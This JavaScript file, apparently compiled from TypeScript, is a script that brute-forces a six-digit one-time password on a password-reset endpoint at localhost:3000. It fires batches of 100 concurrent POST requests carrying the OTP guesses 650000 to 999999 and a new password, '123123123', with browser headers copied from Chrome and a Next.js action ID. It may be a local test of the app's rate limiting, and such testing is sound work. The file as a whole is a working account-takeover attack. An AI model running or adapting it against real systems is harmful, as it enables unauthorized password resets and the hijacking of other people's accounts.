"use strict";
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
const axios_1 = __importDefault(require("axios"));
function sendRequest(otp) {
    return __awaiter(this, void 0, void 0, function* () {
        let data = JSON.stringify({
            "email": "aaaa",
            "otp": otp,
            "newPassword": "123123123"
        });
        let config = {
            method: 'post',
            maxBodyLength: Infinity,
            url: 'http://localhost:3000/reset-password',
            headers: {
                'sec-ch-ua': '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
                'Next-Router-State-Tree': '%5B%22%22%2C%7B%22children%22%3A%5B%22admin%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%5D%7D%5D%7D%2Cnull%2Cnull%2Ctrue%5D',
                'sec-ch-ua-mobile': '?0',
                'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
                'Accept': 'text/x-component',
                'Referer': 'http://localhost:3000/admin',
                'Next-Action': 'a221b071140e55563e91a3226c508cb229c121f6',
                'sec-ch-ua-platform': '"macOS"',
                'Content-Type': 'application/json'
            },
            data: data
        };
        try {
            yield axios_1.default.request(config);
        }
        catch (e) {
            // console.log("error : ",e);
        }
    });
}
function main() {
    return __awaiter(this, void 0, void 0, function* () {
        for (let i = 650000; i < 1000000; i += 100) {
            const promises = [];
            console.log("here for " + i);
            for (let j = 0; j < 100; j++) {
                promises.push(sendRequest(i + j));
            }
            yield Promise.all(promises);
        }
    });
}
// main()
